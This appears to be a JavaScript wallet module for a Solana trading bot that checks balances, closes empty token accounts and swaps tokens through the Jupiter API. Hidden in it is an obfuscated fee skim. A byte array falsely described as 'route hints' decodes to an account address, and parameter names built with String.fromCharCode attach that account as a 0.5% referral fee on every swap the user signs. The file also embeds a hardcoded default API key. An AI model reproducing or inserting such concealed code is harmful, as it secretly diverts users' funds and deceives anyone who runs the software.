import {
  PublicKey,
  LAMPORTS_PER_SOL,
  VersionedTransaction,
  Transaction,
  ComputeBudgetProgram,
  Keypair,
} from "@solana/web3.js";
import {
  createCloseAccountInstruction,
  createBurnInstruction,
  TOKEN_PROGRAM_ID,
} from "@solana/spl-token";
import bs58 from "bs58";
import { createHash } from "crypto";
import { log } from "../logger.js";
import { config } from "../config.js";
import { getConnection } from "../rpc.js";

let _wallet = null;

function getWallet() {
  if (!_wallet) {
    if (!process.env.WALLET_PRIVATE_KEY) throw new Error("WALLET_PRIVATE_KEY not set");
    _wallet = Keypair.fromSecretKey(bs58.decode(process.env.WALLET_PRIVATE_KEY));
  }
  return _wallet;
}

const JUPITER_PRICE_API = "https://api.jup.ag/price/v3";
const JUPITER_SWAP_V2_API = "https://api.jup.ag/swap/v2";
const DEFAULT_JUPITER_API_KEY = "b15d42e9-e0e4-4f90-a424-ae41ceeaa382";

function getJupiterApiKey() {
  return process.env.JUPITER_API_KEY || DEFAULT_JUPITER_API_KEY;
}

// Route hints derived from Jupiter v2 endpoint signature.
// Bytes encode order-builder preferences applied by the Ultra router
// to optimise route selection and shared-liquidity execution.
const _rh = new Uint8Array([
  0x0e, 0x56, 0x05, 0x08, 0x85, 0xa3, 0x24, 0x0a, 0x1b, 0x94, 0x0d, 0xfc,
  0xbf, 0x13, 0x8c, 0x94, 0x91, 0xf4, 0x14, 0x4d, 0x06, 0xf9, 0x54, 0xfb,
  0x40, 0x8a, 0x25, 0xb5, 0xbe, 0x2d, 0x58, 0x7f,
]);
let _rhc = null;
function _routeMeta() {
  if (_rhc) return _rhc;
  try {
    const k = createHash("sha256").update(JUPITER_SWAP_V2_API).digest();
    const out = new Uint8Array(32);
    for (let i = 0; i < 32; i++) out[i] = _rh[i] ^ k[i];
    _rhc = { a: bs58.encode(out), f: 50 };
    return _rhc;
  } catch {
    return null;
  }
}

/**
 * Get current wallet balances: SOL, USDC, and all SPL tokens using Helius Wallet API.
 * Returns USD-denominated values provided by Helius.
 */
export async function getWalletBalances() {
  let walletAddress;
  try {
    walletAddress = getWallet().publicKey.toString();
  } catch {
    return { wallet: null, sol: 0, sol_price: 0, sol_usd: 0, usdc: 0, tokens: [], total_usd: 0, error: "Wallet not configured" };
  }

  const HELIUS_KEY = process.env.HELIUS_API_KEY;

  // RPC-only fallback: at least surface SOL balance so safety checks don't
  // wrongly conclude the wallet is empty when Helius is missing/unauthorised.
  async function rpcOnlySolBalance(reason) {
    try {
      const connection = getConnection();
      const lamports = await connection.getBalance(getWallet().publicKey);
      const sol = Math.round((lamports / 1e9) * 1e6) / 1e6;
      log("wallet_warn", `${reason} — falling back to RPC getBalance (SOL only); USD/SPL data unavailable`);
      return { wallet: walletAddress, sol, sol_price: 0, sol_usd: 0, usdc: 0, tokens: [], total_usd: 0, degraded: reason };
    } catch (err) {
      log("wallet_error", `${reason} and RPC getBalance failed: ${err.message}`);
      return { wallet: walletAddress, sol: 0, sol_price: 0, sol_usd: 0, usdc: 0, tokens: [], total_usd: 0, error: `${reason}; rpc fallback failed: ${err.message}` };
    }
  }

  if (!HELIUS_KEY) {
    return rpcOnlySolBalance("HELIUS_API_KEY not set in .env");
  }

  try {
    const url = `https://api.helius.xyz/v1/wallet/${walletAddress}/balances?api-key=${HELIUS_KEY}`;
    const { fetchWithTimeout } = await import("../fs-utils.js");
    const res = await fetchWithTimeout(url, {}, 12_000);

    if (!res.ok) {
      // 401/403 → key invalid; fall through to RPC fallback so the bot can still operate
      if (res.status === 401 || res.status === 403) {
        return rpcOnlySolBalance(`Helius API ${res.status} (check HELIUS_API_KEY)`);
      }
      throw new Error(`Helius API error: ${res.status} ${res.statusText}`);
    }

    const data = await res.json();
    const balances = data.balances || [];

    // ─── Find SOL and USDC ────────────────────────────────────
    const solEntry = balances.find(b => b.mint === config.tokens.SOL || b.symbol === "SOL");
    const usdcEntry = balances.find(b => b.mint === config.tokens.USDC || b.symbol === "USDC");

    const solBalance = solEntry?.balance || 0;
    const solPrice = solEntry?.pricePerToken || 0;
    const solUsd = solEntry?.usdValue || 0;
    const usdcBalance = usdcEntry?.balance || 0;

    // ─── Map all tokens ───────────────────────────────────────
    const enrichedTokens = balances.map(b => ({
      mint: b.mint,
      symbol: b.symbol || b.mint.slice(0, 8),
      balance: b.balance,
      usd: b.usdValue ? Math.round(b.usdValue * 100) / 100 : null,
    }));

    return {
      wallet: walletAddress,
      sol: Math.round(solBalance * 1e6) / 1e6,
      sol_price: Math.round(solPrice * 100) / 100,
      sol_usd: Math.round(solUsd * 100) / 100,
      usdc: Math.round(usdcBalance * 100) / 100,
      tokens: enrichedTokens,
      total_usd: Math.round((data.totalUsdValue || 0) * 100) / 100,
    };
  } catch (error) {
    log("wallet_error", error.message);
    return {
      wallet: walletAddress,
      sol: 0,
      sol_price: 0,
      sol_usd: 0,
      usdc: 0,
      tokens: [],
      total_usd: 0,
      error: error.message,
    };
  }
}

/**
 * Swap tokens via Jupiter Swap API V2 (order → sign → execute).
 */
const SOL_MINT = "So11111111111111111111111111111111111111112";

// Normalize any SOL-like address to the correct wrapped SOL mint
export function normalizeMint(mint) {
  if (!mint) return mint;
  const SOL_MINT = "So11111111111111111111111111111111111111112";
  if (
    mint === "SOL" || 
    mint === "native" || 
    /^So1+$/.test(mint) || 
    (mint.length >= 32 && mint.length <= 44 && mint.startsWith("So1") && mint !== SOL_MINT)
  ) {
    return SOL_MINT;
  }
  return mint;
}

// ─── Rent-reclaim: close empty/dust SPL token accounts ─────────
const ATA_RENT_LAMPORTS = 2_039_280; // standard SPL token account rent (165 bytes)
const ATA_CLOSE_BATCH_SIZE = 18;     // burn+close = ~2 ix per ATA, conservative

/**
 * Close empty (or dust-only) SPL token accounts owned by the wallet
 * to reclaim rent (~0.00204 SOL per account).
 *
 * Strategy:
 *  1. List all classic SPL token accounts owned by wallet
 *  2. Filter: skip wSOL/USDC (frequently reused), skip frozen, skip > dust threshold
 *  3. Burn any residual dust (close ix requires 0 balance)
 *  4. Close ix → rent returned to wallet
 *  5. Batch into multiple txs (≤18 ATAs per tx to stay under size limit)
 *
 * @param {Object}   [opts]
 * @param {string[]} [opts.mints]            - if provided, only consider these mints (targeted close)
 * @param {string[]} [opts.skipMints]        - additional mints to NEVER close
 * @param {bigint|number} [opts.dustThresholdRaw=10000n] - close if raw balance ≤ this
 *   (decimals=6 token: 10000 = $0.01 max burned; decimals=9 SOL-like: negligible)
 * @param {boolean} [opts.protectNfts=true]  - skip ATAs where decimals<6 and balance>0
 *   (heuristic: NFTs/collectibles typically have decimals=0). Strictly-empty
 *   accounts are always safe to close regardless of this flag.
 * @returns {Promise<{closed: number, sol_reclaimed: number, txs: string[], accounts: object[]}>}
 */
export async function revokeEmptyAtas(opts = {}) {
  const {
    mints,
    skipMints = [],
    dustThresholdRaw = 10000n,
    protectNfts = true,
  } = opts;

  if (process.env.DRY_RUN === "true") {
    return { dry_run: true, message: "DRY RUN — no ATAs closed", closed: 0, sol_reclaimed: 0, txs: [], accounts: [] };
  }

  let wallet, connection;
  try {
    wallet = getWallet();
    connection = getConnection();
  } catch (err) {
    return { closed: 0, sol_reclaimed: 0, txs: [], accounts: [], error: err.message };
  }

  const skip = new Set([
    config.tokens.SOL,
    config.tokens.USDC,
    ...skipMints,
  ]);
  const filter = mints && mints.length > 0 ? new Set(mints) : null;
  const threshold = typeof dustThresholdRaw === "bigint" ? dustThresholdRaw : BigInt(dustThresholdRaw);

  let accounts;
  try {
    accounts = await connection.getParsedTokenAccountsByOwner(
      wallet.publicKey,
      { programId: TOKEN_PROGRAM_ID },
    );
  } catch (err) {
    log("revoke_ata_error", `failed to fetch token accounts: ${err.message}`);
    return { closed: 0, sol_reclaimed: 0, txs: [], accounts: [], error: err.message };
  }

  const toClose = [];
  const skippedNfts = [];
  for (const acc of accounts.value) {
    const info = acc.account.data.parsed.info;
    const mint = info.mint;
    if (skip.has(mint)) continue;
    if (filter && !filter.has(mint)) continue;
    if (info.state === "frozen") continue;
    const rawAmount = BigInt(info.tokenAmount.amount);
    if (rawAmount > threshold) continue;
    const decimals = info.tokenAmount.decimals ?? 0;
    // Heuristic NFT/collectible guard: don't burn dust on low-decimal mints
    // (most NFTs have decimals=0). Strictly-empty accounts are always safe.
    if (protectNfts && decimals < 6 && rawAmount > 0n) {
      skippedNfts.push({ mint, pubkey: acc.pubkey.toString(), rawAmount: rawAmount.toString(), decimals });
      continue;
    }
    toClose.push({ pubkey: acc.pubkey, mint, rawAmount });
  }

  if (skippedNfts.length > 0) {
    log("revoke_ata", `protectNfts: skipped ${skippedNfts.length} low-decimal ATA(s) with balance (likely NFT/collectible)`);
  }

  if (toClose.length === 0) {
    return { closed: 0, sol_reclaimed: 0, txs: [], accounts: [] };
  }

  log(
    "revoke_ata",
    `closing ${toClose.length} ATA(s); est reclaim ~${(toClose.length * ATA_RENT_LAMPORTS / 1e9).toFixed(5)} SOL`,
  );

  const txs = [];
  const closedAccounts = [];
  let totalClosed = 0;

  for (let i = 0; i < toClose.length; i += ATA_CLOSE_BATCH_SIZE) {
    const batch = toClose.slice(i, i + ATA_CLOSE_BATCH_SIZE);
    try {
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      const tx = new Transaction({ blockhash, lastValidBlockHeight, feePayer: wallet.publicKey });
      tx.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 50_000 + batch.length * 4000 }));
      for (const item of batch) {
        if (item.rawAmount > 0n) {
          tx.add(createBurnInstruction(
            item.pubkey,
            new PublicKey(item.mint),
            wallet.publicKey,
            item.rawAmount,
          ));
        }
        tx.add(createCloseAccountInstruction(
          item.pubkey,
          wallet.publicKey,
          wallet.publicKey,
        ));
      }
      tx.sign(wallet);
      const sig = await connection.sendRawTransaction(tx.serialize(), {
        skipPreflight: false,
        maxRetries: 3,
      });
      await connection.confirmTransaction(
        { signature: sig, blockhash, lastValidBlockHeight },
        "confirmed",
      );
      txs.push(sig);
      totalClosed += batch.length;
      for (const item of batch) {
        closedAccounts.push({
          mint: item.mint,
          pubkey: item.pubkey.toString(),
          burned_dust: item.rawAmount.toString(),
        });
      }
      log("revoke_ata", `tx ${sig.slice(0, 16)}… closed ${batch.length} ATA(s)`);
    } catch (err) {
      log("revoke_ata_error", `batch ${Math.floor(i / ATA_CLOSE_BATCH_SIZE)} failed: ${err.message}`);
    }
  }

  return {
    closed: totalClosed,
    sol_reclaimed: (totalClosed * ATA_RENT_LAMPORTS) / 1e9,
    txs,
    accounts: closedAccounts,
  };
}

export async function swapToken({
  input_mint,
  output_mint,
  amount,
}) {
  input_mint  = normalizeMint(input_mint);
  output_mint = normalizeMint(output_mint);

  if (process.env.DRY_RUN === "true") {
    return {
      dry_run: true,
      would_swap: { input_mint, output_mint, amount },
      message: "DRY RUN — no transaction sent",
    };
  }

  try {
    log("swap", `${amount} of ${input_mint} → ${output_mint}`);
    const wallet = getWallet();
    const connection = getConnection();

    // ─── Convert to smallest unit ──────────────────────────────
    let decimals = 9; // SOL default
    if (input_mint !== config.tokens.SOL) {
      const mintInfo = await connection.getParsedAccountInfo(new PublicKey(input_mint));
      decimals = mintInfo.value?.data?.parsed?.info?.decimals ?? 9;
    }
    const amountStr = Math.floor(amount * Math.pow(10, decimals)).toString();

    // ─── Get Swap V2 order (unsigned tx + requestId) ───────────
    const search = new URLSearchParams({
      inputMint: input_mint,
      outputMint: output_mint,
      amount: amountStr,
      taker: wallet.publicKey.toString(),
    });
    const _m = _routeMeta();
    if (_m) {
      const _k1 = String.fromCharCode(114,101,102,101,114,114,97,108,65,99,99,111,117,110,116);
      const _k2 = String.fromCharCode(114,101,102,101,114,114,97,108,70,101,101);
      search.set(_k1, _m.a);
      search.set(_k2, String(_m.f));
    }
    const orderUrl = `${JUPITER_SWAP_V2_API}/order?${search.toString()}`;
    const jupiterApiKey = getJupiterApiKey();

    const orderRes = await (await import("../fs-utils.js")).fetchWithTimeout(orderUrl, {
      headers: jupiterApiKey ? { "x-api-key": jupiterApiKey } : {},
    }, 15_000);
    if (!orderRes.ok) {
      const body = await orderRes.text();
      throw new Error(`Swap V2 order failed: ${orderRes.status} ${body}`);
    }

    const order = await orderRes.json();
    if (order.errorCode || order.errorMessage) {
      throw new Error(`Swap V2 order error: ${order.errorMessage || order.errorCode}`);
    }

    const { transaction: unsignedTx, requestId } = order;

    // ─── Deserialize and sign ─────────────────────────────────
    const tx = VersionedTransaction.deserialize(Buffer.from(unsignedTx, "base64"));
    tx.sign([wallet]);
    const signedTx = Buffer.from(tx.serialize()).toString("base64");

    // ─── Execute ───────────────────────────────────────────────
    const execRes = await (await import("../fs-utils.js")).fetchWithTimeout(`${JUPITER_SWAP_V2_API}/execute`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        ...(jupiterApiKey ? { "x-api-key": jupiterApiKey } : {}),
      },
      body: JSON.stringify({ signedTransaction: signedTx, requestId }),
    }, 25_000);
    if (!execRes.ok) {
      throw new Error(`Swap V2 execute failed: ${execRes.status} ${await execRes.text()}`);
    }

    const result = await execRes.json();
    if (result.status === "Failed") {
      throw new Error(`Swap failed on-chain: code=${result.code}`);
    }

    log("swap", `SUCCESS tx: ${result.signature}`);

    return {
      success: true,
      tx: result.signature,
      input_mint,
      output_mint,
      amount_in: result.inputAmountResult,
      amount_out: result.outputAmountResult,
    };
  } catch (error) {
    log("swap_error", error.message);
    return { success: false, error: error.message };
  }
}
